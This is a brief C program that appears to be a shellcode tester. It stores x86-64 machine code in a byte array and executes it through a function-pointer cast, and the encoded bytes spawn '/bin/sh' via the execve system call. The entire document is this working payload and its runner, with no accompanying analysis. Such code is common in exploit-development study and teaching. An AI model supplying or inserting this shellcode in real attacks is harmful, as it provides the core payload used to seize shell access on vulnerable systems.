
int main()
{
    char shellcode[] =
        "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\x0f\x05";

    (*(void (*)())shellcode)();
}